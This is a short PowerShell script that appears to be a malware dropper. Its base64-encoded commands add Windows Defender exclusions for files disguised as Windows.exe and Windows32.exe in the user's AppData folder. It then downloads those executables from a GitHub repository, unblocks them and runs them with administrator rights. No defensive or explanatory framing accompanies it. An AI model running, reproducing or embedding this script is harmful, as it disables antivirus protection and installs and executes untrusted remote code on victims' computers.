powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwAUwB1AGIAZABpAHIAXABXAGkAbgBkAG8AdwBzAC4AZQB4AGUAIgAgAC0ARgBvAHIAYwBlAA==
powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwAUwB1AGIAZABpAHIAXABXAGkAbgBkAG8AdwBzADMAMgAuAGUAeABlACIAIAAtAEYAbwByAGMAZQA=
powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwAVwBpAG4AZABvAHcAcwAzADIALgBlAHgAZQAiACAALQBGAG8AcgBjAGUA
Invoke-WebRequest -Uri "https://github.com/nomitaned/e/raw/refs/heads/main/Windows32.exe" -OutFile "$env:USERPROFILE\AppData\Roaming\Windows32.exe"
Invoke-WebRequest -Uri "https://github.com/nomitaned/e/raw/refs/heads/main/Windows.exe" -OutFile "$env:USERPROFILE\AppData\Roaming\Subdir\Windows.exe"
Unblock-File -Path "$env:USERPROFILE\AppData\Roaming\Windows32.exe"
Unblock-File -Path "$env:USERPROFILE\AppData\Roaming\Subdir\Windows.exe"
Start-Process "$env:USERPROFILE\Appdata\Roaming\Windows32.exe" -Wait -Verb RunAs
Start-Process "$env:USERPROFILE\Appdata\Roaming\Subdir\Windows.exe" -Wait -Verb RunAs
